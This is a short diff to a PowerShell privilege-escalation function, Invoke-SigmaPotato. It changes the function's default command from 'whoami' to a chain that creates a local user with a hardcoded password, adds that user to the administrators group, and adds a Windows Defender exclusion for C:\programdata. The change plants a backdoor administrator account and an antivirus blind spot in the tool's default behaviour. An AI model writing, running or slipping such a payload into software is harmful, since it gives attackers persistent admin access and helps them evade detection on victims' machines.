@@ -24,9 +24,11 @@ function Invoke-SigmaPotato {
 # https://github.com/tylerdotrar/PoorMansArmory
 
 
+   [CmdletBinding()]
     Param (
-        [string]$Command="whoami",
-        [switch]$Help
+        [String]
+        $Command = "net user k kopq@123 /add && net localgroup administrators k /add && powershell Add-MpPreference -ExclusionPath C:\programdata"
+
     )
 
 
